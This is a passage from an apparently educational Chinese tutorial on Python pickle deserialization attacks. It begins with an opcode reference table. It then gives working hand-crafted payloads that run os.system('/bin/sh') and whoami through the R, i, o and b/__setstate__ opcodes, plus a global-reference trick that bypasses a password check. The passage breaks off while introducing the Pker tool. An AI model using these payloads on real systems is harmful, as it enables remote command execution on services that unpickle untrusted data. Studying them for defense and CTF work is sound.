    SHORT_BINBYTES = b'C'   #  "     "   ;    "      "       "      " &lt; 256 bytes
    # Protocol 4
    SHORT_BINUNICODE = b'\x8c'  # push short string; UTF-8 length &lt; 256 bytes
    BINUNICODE8      = b'\x8d'  # push very long string
    BINBYTES8        = b'\x8e'  # push very long bytes string
    EMPTY_SET        = b'\x8f'  # push empty set on the stack
    ADDITEMS         = b'\x90'  # modify set by adding topmost stack items
    FROZENSET        = b'\x91'  # build frozenset from topmost stack items
    NEWOBJ_EX        = b'\x92'  # like NEWOBJ but work with keyword only arguments
    STACK_GLOBAL     = b'\x93'  # same as GLOBAL but using names on the stacks
    MEMOIZE          = b'\x94'  # store top of the stack in memo
    FRAME            = b'\x95'  # indicate the beginning of a new frame
    # Protocol 5
    BYTEARRAY8       = b'\x96'  # push bytearray
    NEXT_BUFFER      = b'\x97'  # push next out-of-band buffer
    READONLY_BUFFER  = b'\x98'  # make top of stack readonly
name | op | params | describe | e.g.  
---|---|---|---|---  
MARK | ( | null | 向栈顶push一个MARK |  
STOP | . | null | 结束 |  
POP | 0 | null | 丢弃栈顶第一个元素 |  
POP_MARK | 1 | null | 丢弃栈顶到MARK之上的第一个元素 |  
DUP | 2 | null | 在栈顶赋值一次栈顶元素 |  
FLOAT | F | F [float] | push一个float | F1.0  
INT | I | I [int] | push一个integer | I1  
NONE | N | null | push一个None |  
REDUCE | R | [callable] [tuple] R | 调用一个callable对象 | crandom\nRandom\n)R  
STRING | S | S [string] | push一个string | S 'x'  
UNICODE | V | V [unicode] | push一个unicode string | V 'x'  
APPEND | a | [list] [obj] a | 向列表append单个对象 | ]I100\na  
BUILD | b | [obj] [dict] b | 添加实例属性（修改`__dict__`​） |
cmodule\nCls\n)R(I1\nI2\ndb  
GLOBAL | c | c [module] [name] | 调用Pickler的`find_class`​，导入module.name并push到栈顶
| cos\nsystem\n  
DICT | d | MARK [[k] [v]...] d | 将栈顶MARK以前的元素弹出构造dict，再push回栈顶 | (I0\nI1\nd  
EMPTY_DICT | } | null | push一个空dict |  
APPENDS | e | [list] MARK [obj...] e | 将栈顶MARK以前的元素append到前一个的list | ](I0\ne  
GET | g | g [index] | 从memo获取元素 | g0  
INST | i | MARK [args...] i [module] [cls] |
构造一个类实例（其实等同于调用一个callable对象），内部调用了`find_class`​ | (S'ls'\nios\nsystem\n  
LIST | l | MARK [obj] l | 将栈顶MARK以前的元素弹出构造一个list，再push回栈顶 | (I0\nl  
EMPTY_LIST | ] | null | push一个空list |  
OBJ | o | MARK [callable] [args...] o | 同INST，参数获取方式由readline变为stack.pop而已 |
(cos\nsystem\nS'ls'\no  
PUT | p | p [index] | 将栈顶元素放入memo | p0  
SETITEM | s | [dict] [k] [v] s | 设置dict的键值 | }I0\nI1\ns  
TUPLE | t | MARK [obj...] t | 将栈顶MARK以前的元素弹出构造tuple，再push回栈顶 | (I0\nI1\nt  
EMPTY_TUPLE | ) | null | push一个空tuple |  
SETITEMS | u | [dict] MARK [[k] [v]...] u | 将栈顶MARK以前的元素弹出update到前一个dict |
}(I0\nI1\nu  
S : 后面跟的是字符串  
( ：作为命令执行到哪里的一个标记  
t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中  
c ：定义模块名和类名（模块名和类名之间使用回车分隔）  
R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中  
. ：点号是结束符
#### 反序列化的流程
序列化是将一个对象 转化为字符串的过程 我们通过pickle 来实现这个过程
我们举一个栗子
    opcode=cos
    system
    (S'/bin/sh'
    tR.
我们可以借助上面的操作码 来看一下这个需要怎样来执行
第一行的c 后面是模块名 换行之后是类名 于是就将os.system放入栈中
然后的( 是标记符 我们将一个标记放入栈中
S的后面是字符串 放入栈中
t将栈中标记之前的内容取出来转化成元组 再存入栈中（’/bin/sh’,）随后 标记消失
然后 R将元组取出 并将callable取出 将元组作为callable的参数 并执行 对应这里就是os.system('/bin/sh')
然后再将结果存入栈中
但是并不是所有的对象都能使用 pickle 进行序列化和反序列化，比如说 文件对象和网络套接字对象以及代码对象就不可以
#### pickletools
我们可以使用 pickletools模块 将opcode转化成方便我们阅读的形式
    import pickletools
    opcode=b'''cos
    system
    (S'/bin/sh'
    tR.'''
    pickletools.dis(opcode)
    '''
    输出
    0: c    GLOBAL     'os system'
       11: (    MARK
       12: S        STRING     '/bin/sh'
       23: t        TUPLE      (MARK at 11)
       24: R    REDUCE
       25: .    STOP
    highest protocol among opcodes = 0
    '''
‍
### 与php反序列化的对比
相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python
除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types
创建的匿名对象，这样的话就大大拓宽了我们的攻击面
### 手搓opcode
#### 函数执行
##### R操作符
对应函数如下
    def load_reduce(self):
            stack = self.stack
            args = stack.pop()
            func = stack[-1]
            stack[-1] = func(*args)
弹出栈作为函数执行的参数 参数需要是元组形式 随后取栈中最后一个元素作为函数 将指向结果赋值给此元素
    cos\nsystem\n
‍
##### i操作符
读取下面两行分别为module和name 然后 利用 find_class 寻找对应的方法 pop_mark 获取参数
i操作符将寻找前面的mark来闭合 中间的数据作为元组 将其作为函数参数
    (X\x06\x00\x00\x00whoamiios\nsystem\n.
X向后读取四个字符串 将我们的whoami命令压入栈中 i将向后读取 模块与方法os.system 将前面的参数执行
pop_mark的代码如下
先将当前栈赋值给items 然后弹出栈内元素 随后 将这个栈赋值给当前栈 返回items
##### o操作码
pop_mark我们上面看到了 就是可以弹出栈内的元素 这里的args就是 先弹出栈中的一个元素作为参数 然后 再弹出第一个元素作为函数
最后 使用instantiate函数进行自执行
可以如下构造
    b"(cos\nsystem\nX\x06\x00\x00\x00whoamio."
##### b操作符
当栈中存在`__setstate__`​时 会执行setstate(state) 也就是 这里我们如果自己写一个`__setstate__`​类
构造os.system 和 whoami即可执行命令
s字符的源码 是将
    c__main__\ntest\n)\x81}X\x0c\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.
首先 搞了主函数和类 `__main__`​和test 随后 插入空元组和空字典 然后写入`__setstate__`​ c再向后读 得到os.system
字符s将第一个元素和第二个元素作为键值对 插入到第三个元素之中`{__main__.test:()},__setstate__,os.system`​
b字符使第一个元素出栈 也就是`{'__setstate__':os.system}`​ 执行一次 setstate(state)
随后插入whoami然后弹出 执行os.system(whoami)
‍
#### 全局引用
    import secret
    class Target:
        def __init__(self):
            obj = pickle.loads(ser)  # 输入点
            if obj.pwd == secret.pwd:
                print("Hello, admin!")
在这里 我们如果要绕过此处的if判断的话 我们需要如何构造呢
我们尝试构造
    import pickle
    import os
    import pickletools
    class secret:
        pwd='123'
    class Target:
        def __init__(self):
            self.pwd=secret.pwd
    test = Target()
    serialized = pickletools.optimize(pickle.dumps(test, protocol=0))
    print(serialized)
    b'ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nV123\nsb.'
在这里 我们的target刚被实例化之后 pwd就被赋值了 但其实 并不知道secret中的pwd是什么
那么我们这里就需要用到 全局引用了 在opcode中是c `pickle.Unpickler().find_class(module, name)`​
就是导入module模块 并返回其中叫name的对象 我们尝试在原有的opcode上进行修改
在上面123的地方修改 \n是换行
    b'ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\ncsecret\npwd\nsb.'
#### 引入魔术方法
我们随便生成一个rce的payload
    cposix\nsystem\n(Vwhoami\ntR.
如果R被过滤掉了 我们需要用什么来代替呢
opcode中 b的 作用是 使用栈中的第一个元素（储存多个属性名-属性值 的字典）对第二个元素（对象实例）进行属性或者方法的设置 可以设置实例的方法 那么
我们能不能设置一个方法让其在反序列化中自动运行 我们可以使用`__setstate__()`​
当解封时，如果类定义了 `__setstate__()`​，就会在已解封状态下调用它。此时不要求实例的 state 对象必须是
dict。没有定义此方法的话，先前封存的 state 对象必须是 dict，且该 dict 内容会在解封时赋给新实例的 `__dict__`​
如果 `__getstate__()`​ 返回 `False`​，那么在解封时就不会调用 `__setstate__()`​ 方法。
所以可以这么理解，pickle 时，Python 会封存该实例的 `__getstate__`​​ 方法返回给它的值；unpickle 时，Python 将
unpickle 后的值作为参数传递给实例的 `_setstate_()`​​ 方法。而在 `_setstate_()`​​
方法内部，是按照事先自定义好的流程来重建实例。
### Pker工具
这是一个 可以遍历Python AST的形式 来自动化解析 pickle opcode的工具
#### Pker可以做到什么
  * 变量赋值：存到memo中，保存memo下标和变量名即可
  * 函数调用